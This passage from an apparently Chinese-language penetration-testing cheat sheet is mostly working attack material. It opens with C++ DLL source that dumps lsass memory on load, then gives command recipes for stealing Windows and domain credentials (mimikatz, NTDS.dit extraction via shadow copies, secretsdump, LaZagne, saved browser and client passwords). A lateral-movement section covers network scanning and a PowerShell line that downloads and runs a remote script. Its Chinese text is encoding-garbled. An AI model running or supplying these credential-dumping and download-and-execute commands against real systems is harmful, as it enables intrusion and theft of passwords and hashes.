		cout <span class="token operator">&lt;&lt;</span> <span class="token string">"CreateToolhelp32Snapshot Error!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	BOOL bResult <span class="token operator">=</span> <span class="token function">Process32First</span><span class="token punctuation">(</span>hProcessSnap<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>bResult<span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_wcsicmp</span><span class="token punctuation">(</span>pe32<span class="token punctuation">.</span>szExeFile<span class="token punctuation">,</span> L<span class="token string">"lsass.exe"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		bResult <span class="token operator">=</span> <span class="token function">Process32Next</span><span class="token punctuation">(</span>hProcessSnap<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcessSnap<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">typedef</span> <span class="token function">HRESULT</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> _MiniDumpW<span class="token punctuation">)</span><span class="token punctuation">(</span>
	DWORD arg1<span class="token punctuation">,</span> DWORD arg2<span class="token punctuation">,</span> PWCHAR cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> _RtlAdjustPrivilege<span class="token punctuation">)</span><span class="token punctuation">(</span>
	ULONG Privilege<span class="token punctuation">,</span> BOOL Enable<span class="token punctuation">,</span>
	BOOL CurrentThread<span class="token punctuation">,</span> PULONG Enabled<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">dump</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

	HRESULT             hr<span class="token punctuation">;</span>
	_MiniDumpW          MiniDumpW<span class="token punctuation">;</span>
	_RtlAdjustPrivilege RtlAdjustPrivilege<span class="token punctuation">;</span>
	ULONG               t<span class="token punctuation">;</span>

	MiniDumpW <span class="token operator">=</span> <span class="token punctuation">(</span>_MiniDumpW<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>
		<span class="token function">LoadLibrary</span><span class="token punctuation">(</span>L<span class="token string">"comsvcs.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"MiniDumpW"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	RtlAdjustPrivilege <span class="token operator">=</span> <span class="token punctuation">(</span>_RtlAdjustPrivilege<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>
		<span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>L<span class="token string">"ntdll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"RtlAdjustPrivilege"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>MiniDumpW <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">// try enable debug privilege</span>
	<span class="token function">RtlAdjustPrivilege</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> TRUE<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">wchar_t</span>  ws<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token function">swprintf</span><span class="token punctuation">(</span>ws<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> L<span class="token string">"%hd%hs"</span><span class="token punctuation">,</span> <span class="token function">FindPID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">" C:\\windows\\temp\\1.bin full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">MiniDumpW</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ws<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
BOOL APIENTRY <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD  ul_reason_for_call<span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">switch</span> <span class="token punctuation">(</span>ul_reason_for_call<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>
		<span class="token function">dump</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token keyword">case</span> DLL_THREAD_ATTACH<span class="token operator">:</span>
	<span class="token keyword">case</span> DLL_THREAD_DETACH<span class="token operator">:</span>
	<span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>&gt;xxx.exe c:\xx\xx\xx.dllä½¿ç”¨ç»å¯¹è·¯å¾„
</code></pre>
<h4 id="è¿œç¨‹LSASSè¿›ç¨‹è½¬å‚¨-Physmem2profit"><a href="#è¿œç¨‹LSASSè¿›ç¨‹è½¬å‚¨-Physmem2profit" class="headerlink" title="è¿œç¨‹LSASSè¿›ç¨‹è½¬å‚¨-Physmem2profit"></a>è¿œç¨‹LSASSè¿›ç¨‹è½¬å‚¨-Physmem2profit</h4><pre><code>https://github.com/FSecureLABS/physmem2profit
mimikatzè¢«å¤šæ•°å®‰å…¨äººå‘˜ç”¨æ¥è·å–å‡­æ®ï¼Œä½†ç°åœ¨çš„AV/EDRå¾ˆè½»æ˜“çš„è¯†åˆ«å¹¶æŸ¥æ€ï¼Œè¿™é‡Œä¸åœ¨æœåŠ¡å™¨ç«¯ä½¿ç”¨mimikatzï¼Œè¿œç¨‹å¯¹lsassè¿›ç¨‹è¿›è¡Œè½¬å‚¨ã€‚
æœåŠ¡å™¨ç«¯ç›´æ¥ä½¿ç”¨visual studioæ„å»º
physmem2profit-public\server\
</code></pre>
<p><img src="./img/691.png" alt="image"></p>
<pre><code>å®¢æˆ·ç«¯
&gt;git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git
å®¢æˆ·ç«¯è¿™é‡Œå…ˆå®‰è£…
&gt;bash physmem2profit/client/install.sh
</code></pre>
<p><img src="./img/692.png" alt="image"></p>
<pre><code>éœ€è¦å°†æ­¤æ–‡ä»¶
https://github.com/Velocidex/c-aff4/raw/master/tools/pmem/resources/winpmem/att_winpmem_64.sys
ä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œæˆ‘è¿™é‡Œå­˜æ”¾åœ¨c:\windows\temp\ä¸­
æœåŠ¡å™¨ç«¯æ‰§è¡Œ
&gt;Physmem2profit.exe --ip 192.168.0.98 --port 8888 â€“verboseè¿™é‡Œçš„IPæ˜¯æœåŠ¡å™¨ç«¯IP
</code></pre>
<p><img src="./img/693.png" alt="image"></p>
<pre><code>æ”»å‡»ç«¯å®‰è£…æ‰€éœ€æ¨¡å—
</code></pre>
<p><img src="./img/694.png" alt="image"></p>
<pre><code>æ”»å‡»ç«¯æ‰§è¡Œ
&gt;source physmem2profit/client/.env/bin/activate
&gt;cd physmem2profit/client
&gt;python3 physmem2profit --mode all --host 192.168.0.98 --port 8888 --drive winpmem --install &#39;c:\windows\temp\att_winpmem_64.sys&#39; --label test
</code></pre>
<p><img src="./img/695.png" alt="image"></p>
<pre><code>æœåŠ¡å™¨ç«¯å¯ä»¥çœ‹åˆ°
</code></pre>
<p><img src="./img/696.png" alt="image"></p>
<pre><code>æŠŠç”Ÿæˆçš„dmpæ–‡ä»¶è½¬ç§»åˆ°winç³»ç»Ÿä¸Šä½¿ç”¨mimikatzå³å¯è·å¾—hashï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åœ¨linuxä¸Šä½¿ç”¨pypykatzã€‚
</code></pre>
<p><img src="./img/697.png" alt="image"><br><img src="./img/698.png" alt="image"></p>
<pre><code>å†æ¥ä¸€æ¡è½¬å‚¨lsassè¿›ç¨‹çš„å‘½ä»¤
è¦ä»¥systemæƒé™æ‰§è¡Œ
&gt;rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full
</code></pre>
<p><img src="./img/699.png" alt="image"></p>
<h4 id="SqlDumper-mimikatz"><a href="#SqlDumper-mimikatz" class="headerlink" title="SqlDumper+mimikatz"></a>SqlDumper+mimikatz</h4><pre><code>ä½ç½®C:\Program Files\Microsoft SQL Server\number\Shared
&gt;tasklist /svc | findstr lsass.exe  æŸ¥çœ‹lsass.exe çš„PIDå·
&gt;Sqldumper.exe ProcessID PID 0x01100  å¯¼å‡ºmdmpæ–‡ä»¶
&gt;mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit
</code></pre>
<h4 id="Mimipenguin"><a href="#Mimipenguin" class="headerlink" title="Mimipenguin"></a>Mimipenguin</h4><pre><code>æŠ“å–linuxä¸‹hashï¼Œrootæƒé™
https://github.com/huntergregal/mimipenguin
</code></pre>
<h3 id="ç¼“å­˜hashæå–"><a href="#ç¼“å­˜hashæå–" class="headerlink" title="ç¼“å­˜hashæå–"></a>ç¼“å­˜hashæå–</h3><h4 id="æ³¨å†Œè¡¨"><a href="#æ³¨å†Œè¡¨" class="headerlink" title="æ³¨å†Œè¡¨"></a>æ³¨å†Œè¡¨</h4><pre><code>&gt;reg save hklm\sam c:\sam.hive &amp;reg save hklm\system c:\system.hive &amp;reg save hklm\security c:\security.hive
&gt;mimikatz.exe &quot;lsadump::sam /system:sys.hive /sam:sam.hive&quot; exit
</code></pre>
<h4 id="Ninjacopy"><a href="#Ninjacopy" class="headerlink" title="Ninjacopy"></a>Ninjacopy</h4><pre><code>#http://192.168.0.101/powersploit/Exfiltration/Invoke-NinjaCopy.ps1
&gt;powershell -exec bypass
&gt;Import-Module .\invoke-ninjacopy.ps1
&gt;Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive
&gt;Invoke-NinjaCopy â€“Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
&gt;Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Windows\Temp\1.dit&quot;
&gt;Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -ComputerName &quot;dc.zone.com&quot; -LocalDestination &quot;C:\Windows\Temp\1.dit&quot;
</code></pre>
<p><img src="./img/316.png" alt="image"></p>
<h4 id="Quarks-pwdump"><a href="#Quarks-pwdump" class="headerlink" title="Quarks-pwdump"></a>Quarks-pwdump</h4><pre><code>&gt;quarks-pwdump.exe â€“dump-hash-domain
</code></pre>
<h3 id="åŸŸhashæå–"><a href="#åŸŸhashæå–" class="headerlink" title="åŸŸhashæå–"></a>åŸŸhashæå–</h3><h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><pre><code>&gt;ntdsutil
&gt;snapshot
&gt;activate instance ntds
&gt;create
&gt;mount &#123;guid&#125;
&gt;copy è£…è½½ç‚¹\windows\NTDS\ntds.dit d:\ntds_save.dit
&gt;unmount &#123;guid&#125;
&gt;delete &#123;guid&#125;
&gt;quit
&amp;
åˆ›å»º
&gt; ntdsutil snapshot â€œactivate instance ntdsâ€ create quit quit
æŒ‚è½½
&gt; ntdsutil snapshot â€œmount &#123;guid&#125;â€ quit quit
å¤åˆ¶
&gt;copy c:\$SNAP_XXX_VOLUMEC$\windows\NTDS\ntds.dit d:\ntds_save.dit
å¸è½½å¹¶åˆ é™¤
&gt; ntdsutil snapshot â€œunmounts &#123;guid&#125;â€ â€œdelete &#123;guid&#125;â€ quit quit
åˆ é™¤åæ£€æµ‹
&gt; ntdsutil snapshot â€œList Allâ€ quit quit
æå–hash
&gt; QuarksPwDump -dump-hash-domain -ntds-file d:\ntds_save.dit
</code></pre>
<h4 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h4><pre><code>åˆ›å»ºCç›˜å·å½±æ‹·è´
&gt;vssadmin create shadow /for=c:
å¤åˆ¶ntds.dit
&gt;copy &#123;Shadow Copy Volume Name&#125;\windows\NTDS\ntds.dit c:\ntds.dit
åˆ é™¤æ‹·è´
&gt;vssadmin delete shadows /for=c: /quiet
</code></pre>
<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><pre><code>Impacketä¸­çš„secretsdump.py
#impacket-secretsdump â€“system SYSTEM â€“ntds.dit LOCAL
æˆ–
#impacket-secretsdump â€“hashs xxx:xxx â€“just-dc xxx.com/admin\@192.168.1.1
</code></pre>
<h4 id="NTDSDumpex"><a href="#NTDSDumpex" class="headerlink" title="NTDSDumpex"></a>NTDSDumpex</h4><pre><code>&gt;Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Windows\Temp\1.dit&quot;
&gt;reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
https://github.com/zcgonvh/NTDSDumpEx
&gt;NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive
</code></pre>
<h4 id="WMIè°ƒç”¨Vssadmin"><a href="#WMIè°ƒç”¨Vssadmin" class="headerlink" title="WMIè°ƒç”¨Vssadmin"></a>WMIè°ƒç”¨Vssadmin</h4><pre><code>&gt;wmic /node:dc /user:xxxx\admin /password:passwd process call create &quot;cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1&quot;
&gt;wmic /node:dc /user:P xxxx\admin /password: passwd process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2&gt;&amp;1&quot;
&gt;wmic /node:dc /user: xxxx\admin /password: passwd process call create &quot;cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2&gt;&amp;1&quot;
&gt;copy \\10.0.0.1\c$\temp\ntds.dit C:\temp
PS C:\Users\test.PENTESTLAB&gt; copy \\10.0.0.1\c$\temp\SYSTEM.hive C:\temp
</code></pre>
<h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h4><pre><code>PS &gt;Import-Module .\VolumeShadowCopyTools.ps1
PS &gt;New-VolumeShadowCopy -Volume C:\
PS &gt;Get-VolumeShadowCopy
</code></pre>
<h4 id="Nishang-1"><a href="#Nishang-1" class="headerlink" title="Nishang"></a>Nishang</h4><pre><code>PS &gt;Import-Module .\Copy-VSS.ps1
PS &gt;Copy-VSS
PS &gt;Copy-VSS -DestinationDir C:\ShadowCopy\
æˆ–MSFä¸­
Meterpreter&gt;load powershell
Meterpreter&gt;powershell_import /root/Copy-VSS.ps1
Meterpreter&gt;powershell_execute Copy-VSS
</code></pre>
<h4 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre><code>#lsadump::dcsync /domain:xxx.com /all /csv
æˆ–
#privilege::debug
#lsadump::lsa /inject
</code></pre>
<h4 id="MSF-5"><a href="#MSF-5" class="headerlink" title="MSF"></a>MSF</h4><pre><code>#use auxiliary/admin/smb/psexec_ntdsgrab
#set rhost smbdomain smbuser smbpass
#exploit
Ntds.ditæ–‡ä»¶å­˜åœ¨/root/.msf4/loot
åæ¸—é€æ¨¡å—
#use windows/gather/credentials/domain_hashdump
#set session 1
</code></pre>
<h3 id="laZagne"><a href="#laZagne" class="headerlink" title="laZagne"></a>laZagne</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><pre><code>https://github.com/AlessandroZ/LaZagne
&gt;laZagne.exe all -oNè·å–æ‰€æœ‰å¯†ç è¾“å‡ºåˆ°æ–‡ä»¶
Powershell
PS&gt;[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
PS&gt;$vault = New-Object Windows.Security.Credentials.PasswordVault
PS&gt;$vault.RetrieveAll() | % &#123; $_.RetrievePassword();$_ &#125;
</code></pre>
<h4 id="Linux-4"><a href="#Linux-4" class="headerlink" title="Linux"></a>Linux</h4><pre><code>&gt;python3 laZagne.py all
</code></pre>
<h3 id="æ•æ„Ÿä¿¡æ¯"><a href="#æ•æ„Ÿä¿¡æ¯" class="headerlink" title="æ•æ„Ÿä¿¡æ¯"></a>æ•æ„Ÿä¿¡æ¯</h3><h4 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h4><pre><code>ä½¿ç”¨Visual studioç¼–è¯‘
&gt;Seatbelt.exe ALLè·å–æ‰€æœ‰ä¿¡æ¯
</code></pre>
<h4 id="VNCå¯†ç "><a href="#VNCå¯†ç " class="headerlink" title="VNCå¯†ç "></a>VNCå¯†ç </h4><pre><code>&gt;reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server /v password
http://www.cqure.net/wp/tools/password-recovery/vncpwdump/
è§£å¯†
&gt;vncpwdump.exe -k hash 
</code></pre>
<h4 id="Navicatä¿¡æ¯"><a href="#Navicatä¿¡æ¯" class="headerlink" title="Navicatä¿¡æ¯"></a>Navicatä¿¡æ¯</h4><pre><code>&gt;reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v host 
&gt;reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v UserName 
&gt;reg query HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers /s /v pwd
ç¦»çº¿ç ´è§£
https://github.com/HyperSine/how-does-navicat-encrypt-password
</code></pre>
<h4 id="Chromeä¿å­˜çš„å¯†ç "><a href="#Chromeä¿å­˜çš„å¯†ç " class="headerlink" title="Chromeä¿å­˜çš„å¯†ç "></a>Chromeä¿å­˜çš„å¯†ç </h4><pre><code>&gt;mimikatz dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot; /unprotect
</code></pre>
<h4 id="Foxmail"><a href="#Foxmail" class="headerlink" title="Foxmail"></a>Foxmail</h4><pre><code>X:\Foxmail\storage\xxx\Accounts\Account.rec0
ä½¿ç”¨
Foxmail Password Decryptorè§£å¯†
https://securityxploded.com/foxmail-password-decryptor.php
</code></pre>
<h4 id="firefoxä¿å­˜çš„å¯†ç "><a href="#firefoxä¿å­˜çš„å¯†ç " class="headerlink" title="firefoxä¿å­˜çš„å¯†ç "></a>firefoxä¿å­˜çš„å¯†ç </h4><pre><code>https://www.nirsoft.net/password_recovery_tools.html
&gt;webbrowserpassview.exe /LoadPasswordsFirefox 1 /shtml &quot;c:\1.html&quot;
æˆ–
&gt;dir %appdata%\Mozilla\Firefox\Profiles\
&gt;dir %appdata%\Mozilla\Firefox\Profiles\yn80ouvt.default
éœ€å…ˆç»“æŸfirefox.exeè¿›ç¨‹
å‹ç¼©
&gt;7z.exe -r -padmin123 a c:\users\public\firefox.7z C:\Users\Administrator\AppData\Roaming\Mozilla\*.* 
https://github.com/unode/firefox_decrypt
https://securityxploded.com/firefox-master-password-cracker.php
</code></pre>
<h4 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h4><pre><code>C:\Documents and Settings\Administrator\Application Data\VanDykeä¸‹çš„configæ–‡ä»¶å¤¹
C:\program files\Vandyke software\securecrt\
https://github.com/uknowsec/SharpDecryptPwd
</code></pre>
<h2 id="æ¨ªå‘-2"><a href="#æ¨ªå‘-2" class="headerlink" title="æ¨ªå‘"></a>æ¨ªå‘</h2><h3 id="æ¢æµ‹å­˜æ´»ä¸»æœº-1"><a href="#æ¢æµ‹å­˜æ´»ä¸»æœº-1" class="headerlink" title="æ¢æµ‹å­˜æ´»ä¸»æœº"></a>æ¢æµ‹å­˜æ´»ä¸»æœº</h3><h4 id="For-Pingå‘½ä»¤æŸ¥è¯¢å­˜æ´»ä¸»æœº"><a href="#For-Pingå‘½ä»¤æŸ¥è¯¢å­˜æ´»ä¸»æœº" class="headerlink" title="For+Pingå‘½ä»¤æŸ¥è¯¢å­˜æ´»ä¸»æœº"></a>For+Pingå‘½ä»¤æŸ¥è¯¢å­˜æ´»ä¸»æœº</h4><pre><code>&gt;for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.0.%I |findstr &quot;TTL=&quot;
</code></pre>
<p><img src="./img/317.png" alt="image"></p>
<pre><code>For+Pingå‘½ä»¤æŸ¥è¯¢åŸŸåå¯¹åº”IP
&gt;for /f &quot;delims=&quot; %i in (D:/domains.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[192.&quot; &gt;&gt; c:/windows/temp/ds.txt
</code></pre>
<h4 id="å†…å¤–ç½‘èµ„äº§å¯¹åº”"><a href="#å†…å¤–ç½‘èµ„äº§å¯¹åº”" class="headerlink" title="å†…å¤–ç½‘èµ„äº§å¯¹åº”"></a>å†…å¤–ç½‘èµ„äº§å¯¹åº”</h4><pre><code>1.å°†æ”¶é›†åˆ°çš„å­åŸŸåä¿å­˜ï¼Œä½¿ç”¨pingå‘½ä»¤åœ¨å†…ç½‘å¾ªç¯
for /f &quot;delims=&quot; %i in (host.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[10.&quot; /c:&quot;[192.&quot; /c:&quot;[172.&quot; &gt;&gt; C:/users/public/out.txt
2.æ‰¾åˆ°dnsæœåŠ¡å™¨ipï¼Œipconfigæˆ–æ‰«æå¼€å¯53ç«¯å£çš„æœºå™¨
https://github.com/Q2h1Cg/dnsbrute
dnsbrute.exe -domain a.com -dict ziyuming.txt -rate 1000 -retry 1 -server 192.168.1.1:53
3.æ‰«æå†…ç½‘ipå¼€å¯webæœåŠ¡çš„title
</code></pre>
<h4 id="NbtScan"><a href="#NbtScan" class="headerlink" title="NbtScan"></a>NbtScan</h4><pre><code>Windows
&gt;nbtscan.exe -m 192.168.1.0/24
Linux
#nbtscan -r 192.168.0.0/24
</code></pre>
<h4 id="NMAP-1"><a href="#NMAP-1" class="headerlink" title="NMAP"></a>NMAP</h4><pre><code>#nmap -Pn -open -A -n -v -iL filename.txt
-Pnï¼šè·³è¿‡ä¸»æœºå‘ç°
-n:ä¸åšDNSè§£æ
-openï¼šåªæ˜¾ç¤ºå¼€å¯çš„ç«¯å£
-Aï¼šæ‰«æè¿‡ç¨‹ä¸­ï¼Œè¾“å…¥å›è½¦ï¼Œå¯ä»¥æŸ¥çœ‹æ‰«æè¿›åº¦
-vï¼šæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯
-Fï¼šå¿«é€Ÿæ‰«æ100ä¸ªå¸¸è§ç«¯å£
-p:é€‰æ‹©è¦æ‰«æçš„ç«¯å£  ä¾‹ï¼š -p1-65535 ï¼ˆå…¨ç«¯å£æ‰«æï¼Œä¸­é—´æ²¡æœ‰ç©ºæ ¼ï¼‰
-iLï¼šä¸ºç¨‹åºæŒ‡å®šä¸€ä¸ªè¦æ‰«æçš„IPåˆ—è¡¨
-sVï¼šæ¢æµ‹å¼€æ”¾ç«¯å£çš„æœåŠ¡å’Œç‰ˆæœ¬ä¿¡æ¯
-Tå¯ä»¥é€‰æ‹©æ‰«æç­‰çº§ï¼Œé»˜è®¤T3ï¼Œä½†æƒ³å¿«ç‚¹è¯ï¼Œå¯ä»¥è¾“å…¥  -T4
å­˜æ´»ä¸»æœº
&gt;nmap -sP -PI 192.168.0.0/24
&gt;nmap -sn -PE -T4 192.168.0.0/24
&gt;nmap -sn -PR 192.168.0.0/24
</code></pre>
<h5 id="ä»£ç†nmapæ‰«æ"><a href="#ä»£ç†nmapæ‰«æ" class="headerlink" title="ä»£ç†nmapæ‰«æ"></a>ä»£ç†nmapæ‰«æ</h5><pre><code>meterpreter &gt; background
msf &gt; use auxiliary/server/socks4a
å†é…ç½®proxychains.conf
#proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse å†…ç½‘IP
</code></pre>
<h4 id="NetDiscover"><a href="#NetDiscover" class="headerlink" title="NetDiscover"></a>NetDiscover</h4><pre><code>#netdiscover -r 192.168.0.0/24 -i wlan0
</code></pre>
<h4 id="rp-scan"><a href="#rp-scan" class="headerlink" title="rp-scan"></a>rp-scan</h4><pre><code>kali
&gt;arp-scan --interface=wlan0 -localnet
Windows
&gt;arp-scan.exe -t 192.168.0.0/24
</code></pre>
<h4 id="MSF-6"><a href="#MSF-6" class="headerlink" title="MSF"></a>MSF</h4><pre><code>#use auxiliary/scanner/discovery/arp_sweep
</code></pre>
<p><img src="./img/318.png" alt="image"></p>
<pre><code>#use auxiliary/scanner/discovery/udp_sweep
</code></pre>
<p><img src="./img/319.png" alt="image"></p>
<pre><code>#use auxiliary/scanner/netbios/nbname
meterpreter&gt;run post/windows/gather/arp_scanner RHOSTS=192.168.1.1/24
meterpreter&gt;run post/multi/gather/ping_sweep RHOSTS=192.168.1.1/24
</code></pre>
<h3 id="æ¢æµ‹æœåŠ¡-amp-ç«¯å£"><a href="#æ¢æµ‹æœåŠ¡-amp-ç«¯å£" class="headerlink" title="æ¢æµ‹æœåŠ¡&amp;ç«¯å£"></a>æ¢æµ‹æœåŠ¡&amp;ç«¯å£</h3><pre><code>å¸¸è§ç«¯å£
</code></pre>
<table>
<thead>
<tr>
<th>æœåŠ¡</th>
<th>ç«¯å£</th>
</tr>
</thead>
<tbody><tr>
<td>Mssql</td>
<td>1433</td>
</tr>
<tr>
<td>SMB</td>
<td>445</td>
</tr>
<tr>
<td>WMI</td>
<td>135</td>
</tr>
<tr>
<td>winrm</td>
<td>5985</td>
</tr>
<tr>
<td>rdp</td>
<td>3389</td>
</tr>
<tr>
<td>ssh</td>
<td>22</td>
</tr>
<tr>
<td>oracle</td>
<td>1521</td>
</tr>
<tr>
<td>mysql</td>
<td>3306</td>
</tr>
<tr>
<td>redis</td>
<td>6379</td>
</tr>
<tr>
<td>postgresql</td>
<td>5432</td>
</tr>
<tr>
<td>ldap</td>
<td>389</td>
</tr>
<tr>
<td>smtp</td>
<td>25</td>
</tr>
<tr>
<td>pop3</td>
<td>110</td>
</tr>
<tr>
<td>imap</td>
<td>143</td>
</tr>
<tr>
<td>exchange</td>
<td>443</td>
</tr>
<tr>
<td>vnc</td>
<td>5900</td>
</tr>
<tr>
<td>ftp</td>
<td>21</td>
</tr>
<tr>
<td>rsync</td>
<td>873</td>
</tr>
<tr>
<td>mongodb</td>
<td>27017</td>
</tr>
<tr>
<td>telnet</td>
<td>23</td>
</tr>
<tr>
<td>svn</td>
<td>3690</td>
</tr>
<tr>
<td>java rmi</td>
<td>1099</td>
</tr>
<tr>
<td>couchdb</td>
<td>5984</td>
</tr>
<tr>
<td>pcanywhere</td>
<td>5632</td>
</tr>
<tr>
<td>web</td>
<td>80-90,8000-10000,7001,9200,9300</td>
</tr>
</tbody></table>
<h4 id="Powershell-3"><a href="#Powershell-3" class="headerlink" title="Powershell"></a>Powershell</h4><h5 id="Powersploit"><a href="#Powersploit" class="headerlink" title="Powersploit"></a>Powersploit</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Recon/Invoke-Portscan.ps1&#39;); Invoke-Portscan -Hosts 192.168.0.0/24 â€“T 4 -Ports &#39;1-65535&#39; -oA C:\TEMP.txt&quot;
</code></pre>
